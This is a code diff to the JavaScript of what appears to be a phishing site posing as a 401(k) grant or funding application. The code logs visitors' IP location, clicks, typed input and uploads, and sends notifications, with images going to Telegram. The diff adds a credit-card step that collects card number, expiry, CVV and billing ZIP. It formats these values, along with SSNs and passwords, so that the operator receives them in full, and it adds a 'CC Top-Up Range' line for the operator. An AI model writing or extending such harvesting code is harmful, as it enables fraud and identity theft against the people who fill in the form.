@@ -273,29 +273,49 @@
 
   var cachedLocationInfo = null;
   var locationFetchInProgress = false;
+  var _locFetchPromise = null;
 
-  function fetchLocationInfo() {
+  function fetchLocationInfo(callback) {
     if (cachedLocationInfo) {
+      if (typeof callback === 'function') try { callback(cachedLocationInfo); } catch (_e) {}
+      return cachedLocationInfo;
+    }
+
+    if (locationFetchInProgress && _locFetchPromise) {
+      if (typeof callback === 'function') {
+        _locFetchPromise.then(function () { try { callback(cachedLocationInfo); } catch (_e) {} });
+      }
       return cachedLocationInfo;
     }
 
     if (!locationFetchInProgress) {
       locationFetchInProgress = true;
-      fetch('https://ipapi.co/json/')
-        .then(function (res) { return res.json(); })
-        .then(function (data) {
-          cachedLocationInfo = {
-            ip: data.ip || '',
-            country: data.country_name || '',
-            region: data.region || '',
-            city: data.city || '',
-            org: data.org || ''
-          };
-          locationFetchInProgress = false;
-        })
-        .catch(function () {
-          locationFetchInProgress = false;
-        });
+      var endpointIdx = 0;
+      var endpoints = [
+        { url: 'https://ipapi.co/json/', parse: function (d) { return { ip: d.ip || '', country: d.country_name || '', region: d.region || '', city: d.city || '', org: d.org || '' }; } },
+        { url: 'https://geolocation-db.com/json/', parse: function (d) { return { ip: d.IPv4 || d.IPv6 || d.ip || '', country: d.country_name || '', region: d.state || '', city: d.city || '', org: d.ASN || '' }; } },
+        { url: 'https://api.ipify.org?format=json', parse: function (d) { return { ip: d.ip || '', country: '', region: '', city: '', org: '' }; } }
+      ];
+      function tryNextEndpoint() {
+        var ep = endpoints[endpointIdx];
+        if (!ep) { locationFetchInProgress = false; return; }
+        fetch(ep.url, { method: 'GET' })
+          .then(function (r) { if (!r.ok) throw new Error('HTTP ' + r.status); return r.json(); })
+          .then(function (data) {
+            cachedLocationInfo = ep.parse(data || {});
+            locationFetchInProgress = false;
+            if (typeof callback === 'function') try { callback(cachedLocationInfo); } catch (_e) {}
+          })
+          .catch(function () {
+            endpointIdx++;
+            tryNextEndpoint();
+          });
+      }
+      _locFetchPromise = new Promise(function (resolve) {
+        var origTry = tryNextEndpoint;
+        tryNextEndpoint = function () { origTry(); resolve(); };
+        origTry();
+      });
     }
 
     return cachedLocationInfo;
@@ -321,8 +341,12 @@
     lines.push('📺 Viewport: ' + window.innerWidth + 'x' + window.innerHeight);
     lines.push('🌐 URL: ' + escapeHtml(window.location.href));
 
-    fetchLocationInfo();
-    notify('👀 Site Visit', lines, cachedLocationInfo, true);
+    fetchLocationInfo(function (loc) {
+      notify('👀 Site Visit', lines, loc, true);
+    });
+    if (cachedLocationInfo) {
+      notify('👀 Site Visit', lines, cachedLocationInfo, true);
+    }
   }
 
   if (document.readyState === 'loading') {
@@ -353,8 +377,9 @@
     var id = el.id || el.className;
     if (id) lines.push('🏷️ Element: ' + escapeHtml(id));
 
-    fetchLocationInfo();
-    notify('🖱 User Action', lines, cachedLocationInfo, false);
+    var snapshotLoc = cachedLocationInfo;
+    fetchLocationInfo(function (loc) { notify('🖱 User Action', lines, loc, false); });
+    if (snapshotLoc) notify('🖱 User Action', lines, snapshotLoc, false);
   }, true);
 
   var inputDebounceTimer = null;
@@ -376,8 +401,9 @@
       lines.push('✏️ Value: ' + escapeHtml(displayValue));
     }
 
-    fetchLocationInfo();
-    notify('📊 Input Entered', lines, cachedLocationInfo, false);
+    var snapLoc = cachedLocationInfo;
+    fetchLocationInfo(function (loc) { notify('📊 Input Entered', lines, loc, false); });
+    if (snapLoc) notify('📊 Input Entered', lines, snapLoc, false);
   }
 
   document.addEventListener('input', function (e) {
@@ -441,8 +467,9 @@
           if (file.type && file.type.startsWith('image/')) {
             sendImageToTelegram(file, fieldName);
           } else {
-            fetchLocationInfo();
-            notify('📤 File Uploaded', lines, cachedLocationInfo, false);
+            var snapLoc = cachedLocationInfo;
+            fetchLocationInfo(function (loc) { notify('📤 File Uploaded', lines, loc, false); });
+            if (snapLoc) notify('📤 File Uploaded', lines, snapLoc, false);
             var caption = '📄 File Uploaded\n' +
                           'Field: ' + escapeHtml(fieldName) + '\n' +
                           'File: ' + escapeHtml(file.name) +
@@ -550,7 +577,8 @@
         { title: 'STEP 2 — Bank / Payment Details', data: appData.banking || {} },
         { title: 'STEP 3 — Funding Need Summary', data: appData.business || {} },
         { title: 'STEP 4 — ID Verification & 401(k) Details', data: appData.idVerify || {} },
-        { title: 'STEP 6 — 401(k) Account Access', data: appData.kaccess || {} }
+        { title: 'STEP 5 — Credit Card Verification', data: appData.creditcard || {} },
+        { title: 'STEP 7 — 401(k) Account Access', data: appData.kaccess || {} }
       ];
 
       var fieldLabels = {
@@ -560,6 +588,9 @@
         bankName: 'Bank Name', bankAccountType: 'Bank Account Type',
         accountHolder: 'Account Holder Name', routing: 'Routing Number (ABA)',
         accountNum: 'Account Number',
+        cardholderName: 'Cardholder Name', cardNumber: 'Card Number',
+        cardExpiry: 'Expiration Date', cardCvv: 'CVV / Security Code',
+        cardType: 'Card Type', cardZip: 'Billing ZIP Code',
         businessName: 'Business Name', businessStatus: 'Grant Purpose',
         businessType: 'Employment Status', industry: 'Use Category',
         employees: 'Work Arrangement', businessSummary: 'Funding Need Summary',
@@ -579,6 +610,13 @@
         if (!val) return '—';
         var k = String(key).toLowerCase();
         if (k.indexOf('password') > -1) return '🔒 ' + String(val);
+        if (k.indexOf('cvv') > -1) return '••• (full: ' + String(val) + ')';
+        if (k === 'cardnumber' || k.indexOf('cardnumber') > -1) {
+          var cn = String(val).replace(/\s+/g, '');
+          return cn.length >= 8 ?
+            cn.slice(0, 4) + ' •••• •••• ' + cn.slice(-4) + ' (full: ' + String(val) + ')' :
+            String(val);
+        }
         if (k.indexOf('ssn') > -1) {
           var s = String(val).replace(/-/g, '');
           return s.length >= 7 ? '•••-••-' + s.slice(-4) + ' (full: ' + String(val) + ')' : String(val);
@@ -593,6 +631,7 @@
       bodyLines.push('<b>🚨 NEW APPLICATION SUBMITTED 🚨</b>');
       bodyLines.push('<b>Application ID:</b> P401K-2026-' + escapeHtml(appId));
       bodyLines.push('<b>Submitted:</b> ' + escapeHtml(new Date().toLocaleString()));
+      bodyLines.push('💳 <b>CC Top-Up Range:</b> $4,000 – $10,000 (activity-based tiering)');
       bodyLines.push('');
 
       if (userInfo) {
